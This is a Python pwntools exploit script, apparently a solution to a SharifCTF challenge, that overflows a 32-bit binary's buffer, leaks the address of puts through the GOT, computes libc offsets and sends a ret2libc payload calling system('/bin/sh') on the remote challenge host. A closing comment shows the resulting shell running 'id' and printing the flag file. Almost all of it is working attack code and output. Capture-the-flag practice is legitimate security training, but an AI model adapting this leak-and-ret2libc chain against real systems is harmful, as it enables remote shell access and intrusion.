from pwn import *

'''
It all started with a leak bang
nc ctf.sharif.edu 4801 
Alternative: nc 213.233.161.38 4801
'''

local = False

if local:
	r = process("./vuln4")
else:
	r = remote("213.233.161.38", 4801)

# leak puts address
puts_got = 0x8049874
puts_plt = 0x80483A0
main = 0x80484EA

r.recvuntil("yourself\n")

payload = "A"*22 + p32(puts_plt) + p32(main) + p32(puts_got) # return to main

r.sendline(payload)

s = r.recvuntil("This")[:-5]
puts_libc = u32(s[0:4])
info("puts_libc = %s" % hex(puts_libc))

r.recvuntil("yourself\n")

# system("/bin/sh")
system_offset = 0x565b4ca0-0x5658fda0
bin_sh_offset = 0x566b0a0b-0x565b4ca0

system_libc = puts_libc - system_offset
bin_sh = puts_libc + bin_sh_offset

info("system_libc = %s" % hex(system_libc))
info("bin_sh = %s" % hex(bin_sh))

payload = "A"*22 + p32(system_libc) + p32(main) + p32(bin_sh)

r.sendline(payload)

r.interactive()

'''
[*] puts_libc = 0xb75cbca0
[*] system_libc = 0xb75a6da0
[*] bin_sh = 0xb76c7a0b
[*] Switching to interactive mode
$ id
uid=1002(ctfuser) gid=1002(ctfuser) groups=1002(ctfuser)
$ cat /home/ctfuser/flag
SharifCTF{7af9dab81dff481772609b97492d6899}
'''

